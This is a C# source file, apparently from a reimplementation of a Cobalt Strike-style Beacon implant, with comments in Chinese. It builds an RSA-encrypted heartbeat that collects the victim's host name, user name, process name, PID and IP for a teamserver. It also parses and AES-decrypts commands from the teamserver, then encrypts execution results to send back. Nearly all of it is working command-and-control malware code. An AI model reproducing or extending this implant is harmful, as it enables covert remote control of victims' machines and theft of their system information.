using System;
using System.Collections.Generic;
using Beacon.Profiles;
using Beacon.Crypt;
using Beacon.Core;
using Beacon.Utils;
using System.Linq;

namespace Beacon.Packet
{
    /// <summary>
    /// 负责心跳包的拼接、接收到teamserver数据的解密及加密执行后的数据
    /// </summary>
    class Prase
    {
        public string _strMetaData;                                                         //心跳包数据（元数据）
        public int _nCommonType;                                                            //teamserver返回数据类型
        public byte[] _pCommandBuff;                                                        //teamserver返回的数据
        public int _nCommandBuffLen;                                                        //teamserver返回的数据命令长度
        public bool _bRemain;                                                               //后续还有数据要处理

        public Prase() {
            _strMetaData = RSAEncryptMetaInfo(MakeMetaData());
        }

        /// <summary>
        /// 生成随机数，用于得到hmac和aes的key
        /// </summary>
        public void GenRandomAESKey()
        {
            /*Random rnd = new Random();
            Config.GlobalKey = new byte[16];
            rnd.NextBytes(Config.GlobalKey);*/
        }


        /// <summary>
        /// 构造元数据（心跳包）
        /// </summary>
        /// <returns>构造好的元数据</returns>
        public Byte[] MakeMetaData()
        {
            GenRandomAESKey();                                                                  //生成16位随机字节

            Byte[] pSHA256 = SHA.Sha256(Config.GlobalKey);
#if DEBUG
            Console.WriteLine("pSHA256 :{0}",Convert.ToBase64String(pSHA256));
#endif
            Config._AesKey = new byte[16];                                                      //前16位作为hmackey
            Array.Copy(pSHA256, 0, Config._AesKey, 0,16);
#if DEBUG
            Console.WriteLine("_AesKey :{0}", Convert.ToBase64String(Config._AesKey));
#endif
            Config._HmacKey = new byte[16];                                                     //后16位作为aeskey
            Array.Copy(pSHA256, 16, Config._HmacKey, 0, 16);
#if DEBUG
            Console.WriteLine("_HmacKey :{0}", Convert.ToBase64String(Config._HmacKey));
#endif

            Metadata md = new Metadata();                                                       //获取系统的基本信息
            short sSSHPort = 1;
            short sOsBuild = 0;

            int ptrFuncAddr = 0;
            int ptrGMHFuncAddr = 0;
            int ptrGPAFuncAddr = 0;

            short sLocalANSI = 0;
            short sLocalOEM = 0;

            byte[] pBeaconID = BitConverter.GetBytes(md._nBeaconId);                            //将基本信息转为byte[]
            byte[] pPid = BitConverter.GetBytes(md._nPid);
            byte[] pSSHPortBuf = BitConverter.GetBytes(sSSHPort);

            byte[] pOsBuild = BitConverter.GetBytes(sOsBuild);
            byte[] pLocalIP = BitConverter.GetBytes(md._nLocalIP);

            byte[] pLocalANSI = BitConverter.GetBytes(sLocalANSI);
            byte[] pLocalOEM = BitConverter.GetBytes(sLocalOEM);

            byte[] pFuncAddr = BitConverter.GetBytes(ptrFuncAddr);
            byte[] pGMHFuncAddr = BitConverter.GetBytes(ptrGMHFuncAddr);
            byte[] pGPAFuncAddr = BitConverter.GetBytes(ptrGPAFuncAddr);

            string strOsInfo = md._strHostName + "\t" + md._strUserName + "\t" + md._strProcName;
            byte[] pOsInfo = Bytes.FromString(strOsInfo);

            List<byte> SysInfoList = new List<byte>();                                   
            Array.Reverse(pLocalIP);                                                      //转大端
            Array.Reverse(pPid);
            Array.Reverse(pBeaconID);
            Config._nBeaconID = md._nBeaconId;

            SysInfoList.AddRange(Config.GlobalKey);                                        //代码页、key等信息
            SysInfoList.AddRange(pLocalANSI);
            SysInfoList.AddRange(pLocalOEM);

            SysInfoList.AddRange(pBeaconID);                                               //拼接系统基本信息
            SysInfoList.AddRange(pPid);
            SysInfoList.AddRange(pSSHPortBuf);
            SysInfoList.Add(md._bFlag);
            SysInfoList.Add(md._bMajorVerison);
            SysInfoList.Add(md._bMinorVersion);
            SysInfoList.AddRange(pOsBuild);
            SysInfoList.AddRange(pFuncAddr);
            SysInfoList.AddRange(pGMHFuncAddr);
            SysInfoList.AddRange(pGPAFuncAddr);
            SysInfoList.AddRange(pLocalIP);
            SysInfoList.AddRange(pOsInfo);

            Byte[] pSystemInfo = SysInfoList.ToArray();

            byte[] pMagicHeader = BitConverter.GetBytes(Config._nMagicHeader);
            Array.Reverse(pMagicHeader);
            int nInfoLen = pSystemInfo.Length;
            byte[] pInfoLen = BitConverter.GetBytes(nInfoLen);
            Array.Reverse(pInfoLen);

            List<byte> packetDataList = new List<byte>();                                   //前面继续补充魔数、数据长度等信息
            packetDataList.AddRange(pMagicHeader);
            packetDataList.AddRange(pInfoLen);
            packetDataList.AddRange(pSystemInfo);
            Byte[] pPacketData = packetDataList.ToArray();

            return pPacketData;

        }

        /// <summary>
        /// 加密元数据
        /// </summary>
        /// <param name="plainBytes">已构造的元数据内容</param>
        /// <returns>加密构造后的元数据</returns>
        public string RSAEncryptMetaInfo(Byte[] plainBytes)
        {
            RsaPkcs8CryptoUtil _rsaCryptoUtil = new RsaPkcs8CryptoUtil();
            Bytes _bytesUtil = new Bytes();

            //_key = _rsaCryptoUtil.GenerateKeys();
            
            //var plainBytes = _bytesUtil.FromString(plainText);
            var encryptedBytes = _rsaCryptoUtil.Encrypt(plainBytes, Config._key.Public);
            var encryptedText = Bytes.ToBase64(encryptedBytes);
#if DEBUG
            Console.WriteLine("Plain text:{0}, encrypted text:{1}", plainBytes, encryptedText);
#endif
            return encryptedText;
        }


        /// <summary>
        /// 解密teamserver端返回的加密数据
        /// </summary>
        /// <param name="EncryptReponseData">teamserver端返回的加密数据</param>
        /// <returns>返回解密后的数据</returns>
        public byte[] AESDecryptReponseData(Byte[] EncryptReponseData) 
        {
#if DEBUG
            Console.WriteLine("EncryptReponseData :{0}", Convert.ToBase64String(EncryptReponseData));
#endif
            byte[] pHash = new byte[16];
            Array.Copy(EncryptReponseData, EncryptReponseData.Length - 16, pHash, 0, 16);
#if DEBUG
            Console.WriteLine("pHash :{0}", Convert.ToBase64String(pHash));
#endif
            byte[] pEncryptData = new byte[EncryptReponseData.Length - 16];
            Array.Copy(EncryptReponseData, 0, pEncryptData, 0, EncryptReponseData.Length - 16);
#if DEBUG
            Console.WriteLine("pEncryptData :{0}", Convert.ToBase64String(pEncryptData));
#endif

            byte[] pDecryptData = AESCrypt.AesDecrypt(pEncryptData,Config._AesKey, Bytes.FromString(Config._IV));

            return pDecryptData;
        }

        /// <summary>
        /// 解析teamserver端返回的数据
        /// </summary>
        /// <param name="pReponseData">teamserver端返回的数据</param>
        /// <returns>解析成功返回true，否则返回false</returns>
        public bool AnalysisReponseData(byte[] pReponseData)
        {
            _bRemain = false;
            byte[] pTimestamp = new byte[4];                                        //时间戳
            Array.Copy(pReponseData, 0, pTimestamp, 0, 4);

            byte[] pDataLen = new byte[4];
            Array.Copy(pReponseData, 4, pDataLen, 0, 4);                            //数据长度
            Array.Reverse(pDataLen);
            uint nDataLen = BitConverter.ToUInt32(pDataLen, 0);
            if (nDataLen <= 0) 
            {
                return false;
            }

            byte[] pData = new byte[nDataLen];
            Array.Copy(pReponseData, 8, pData, 0, nDataLen);                        //数据内容

            byte[] pCommandType = new byte[4];
            Array.Copy(pData, 0, pCommandType, 0, 4);                               //类型
            Array.Reverse(pCommandType);
            this._nCommonType = BitConverter.ToInt32(pCommandType, 0);

            byte[] pCommandBufLen = new byte[4];
            Array.Copy(pData, 4, pCommandBufLen, 0, 4);                             //命令长度
            Array.Reverse(pCommandBufLen);
            _nCommandBuffLen = BitConverter.ToInt32(pCommandBufLen, 0);

            uint nCommandBuffLenTmp = nDataLen - 8;
            /*uint nCommandBuffLenTmp = nDataLen - 8;                                         //命令长度2
            if (_nCommandBuffLen < nCommandBuffLenTmp) 
            {
                _bRemain = true;                                                    //后面还有数据需要处理
                _nRemainLen = (int)(nCommandBuffLenTmp - _nCommandBuffLen);
                _pRemainBuf = new byte[_nRemainLen];
                Array.Copy(pData, 8 + _nCommandBuffLen, _pRemainBuf, 0, _nRemainLen);           //保存后面还要处理的数据
            }                                    
            //两个命令长度进行判断，大于则后面还有东西，设置标志位 _flag，
            //判断标志位，还要继续读后面4字节，再解析该4字节
            */

            this._pCommandBuff = new byte[nCommandBuffLenTmp];
            Array.Copy(pData, 8, _pCommandBuff, 0, nCommandBuffLenTmp);

            return true;
        }

        /// <summary>
        /// 拼接执行后的数据返回给teamserver
        /// </summary>
        /// <param name="nType">返回的数据类型</param>
        /// <param name="pData">执行后的数据</param>
        /// <returns>构造后的数据</returns>
        public byte[] MakeCallbackData(int nType,byte[] pData) 
        {
            List<byte> pDataList = new List<byte>();

            Config._nCount += 1;                                                    //写入返回包的序号
            byte[] pCount = BitConverter.GetBytes(Config._nCount);
            Array.Reverse(pCount);
            pDataList.AddRange(pCount);

            int nDataLen = pData.Length + 4;                                        //写入返回包数据长度
            byte[] pDataLen = BitConverter.GetBytes(nDataLen);
            Array.Reverse(pDataLen);
            pDataList.AddRange(pDataLen);

            byte[] pType = BitConverter.GetBytes(nType);                            //写入返回包的类型
            Array.Reverse(pType);
            pDataList.AddRange(pType);

            pDataList.AddRange(pData);                                              //写入返回包数据

            byte[] pEncryptData = AESCrypt.AesEncrypt(pDataList.ToArray(), Config._AesKey, Bytes.FromString(Config._IV));

            List<byte> pEncryptCallbakDataList = new List<byte>();
            byte[] pEncryptCallbakDataLen = BitConverter.GetBytes(pEncryptData.Length + 16);
            Array.Reverse(pEncryptCallbakDataLen);

            pEncryptCallbakDataList.AddRange(pEncryptCallbakDataLen);               //拼接加密后的返回数据长度
            pEncryptCallbakDataList.AddRange(pEncryptData);                         //拼接加密后的返回数据

            Byte[] pEncryptDataHash = SHA.Sha256(pEncryptData, Config._HmacKey);
            pEncryptCallbakDataList.AddRange(pEncryptDataHash);            //拼接hash



            return pEncryptCallbakDataList.ToArray();
        }

    }
}
